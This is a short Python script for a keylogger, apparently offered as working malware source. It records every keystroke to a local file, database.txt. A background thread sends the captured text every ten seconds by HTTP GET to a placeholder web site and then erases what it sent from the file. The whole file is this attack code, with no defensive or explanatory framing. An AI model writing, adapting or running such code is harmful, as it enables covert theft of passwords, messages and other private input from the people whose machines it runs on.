import keyboard as keybo
import requests as req
import time
import threading

char = {"shift" : "",
        "right shift" : "",
        "enter" : "\n",
        "backspace" : "<--",
        "space" : " "}
start = time.time()
prevdata = ""
cond = True

def sendinfo():
    global prevdata, cond
    while cond:
        print("Here")
        try:
            file = open("database.txt")
            newdata = file.read()
            if prevdata != newdata:
                print("Sent")
                req.get("<YOUR WEB SITE>.com  "+newdata)############################
                
                file = open("database.txt")
                data = file.read()
                leftdata = data.replace(newdata,"")
                file = open("database.txt","w")
                file.write(leftdata)
                file.close()
                prevdata = newdata
            time.sleep(10)
        except:
            pass

def main():
    global cond
    while True:
        file = open("database.txt","a")
        key = keybo.read_key()
        if key == "f5":
            print("Ended")
            cond = False
            break
        try:
            pressed = char[key]
            print(pressed,end="")
            file.write(pressed)
            
        except:
            print(key,end="")
            file.write(key)
        file.close()
        time.sleep(0.12)

try:
    open("database.txt")
except:
    file = open("database.txt","w")
    file.close()

thread = threading.Thread(target=sendinfo)
thread.start()
main()
